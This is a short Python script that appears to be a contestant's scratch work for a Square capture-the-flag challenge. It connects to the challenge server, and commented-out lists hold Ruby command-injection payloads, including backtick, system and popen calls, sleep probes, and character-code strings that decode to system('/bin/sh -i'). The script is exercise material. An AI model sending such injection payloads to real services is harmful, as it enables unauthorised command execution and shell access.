#!/usr/bin/env python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('talk-to-me-dd00922915bfc3f1.squarectf.com', 5678))


# trial = ['1','0','a','z',':','$','(',"()","system('ls')","`ls`","%x[date]","systemu date","1 1 1 1", "A"*1000,'open("| ls")','IO.popen("ls").read','Kernel.exec("ls")','`ls`','system("ls")','exec("ls")','%x{/bin/ls}',"'' << 115 << 121 << 115 << 116 << 101 << 109 << 40 << 34 << 108 << 115 << 34 << 41", "'' << 115 << 121 << 115 << 116 << 101 << 109 << 40 << 34 << 47 << 98 << 105 << 110 << 47 << 108 << 115 << 34 << 41",'eval("\'\' << 115 << 121 << 115 << 116 << 101 << 109 << 40 << 34 << 108 << 115 << 34 << 41")',"'' << 115 << 121 << 115 << 116 << 101 << 109 << 40 << 34 << 47 << 98 << 105 << 110 << 47 << 115 << 104 << 34 << 41","'' << 115 << 101 << 110 << 100 << 95 << 100 << 97 << 116 << 97 << 32 << 39 << 99 << 39","'' << 115 << 121 << 115 << 116 << 101 << 109 << 40 << 34 << 47 << 98 << 105 << 110 << 47 << 115 << 104 << 32 << 45 <<105 << 34 << 41", 'p "I wish you would great the way I greeted you."',"sleep(300)","'' << 115 << 108 << 101 << 101 << 112 << 40 << 50 << 50 << 50 << 41"]
# trial = ['system','s','system()','system system','""','`ls`','1',':','1 1','sleep(1000)','send_data `ls`',"'' << 115 << 108 << 101 << 101 << 112 << 40 << 50 << 50 << 50 << 41"]
greet = []
for x in greet:
    data = s.recv(10000)
    print(data)
    print(x)
    s.sendall(x.encode('utf-8'))

data = s.recv(10000)
print(data) 
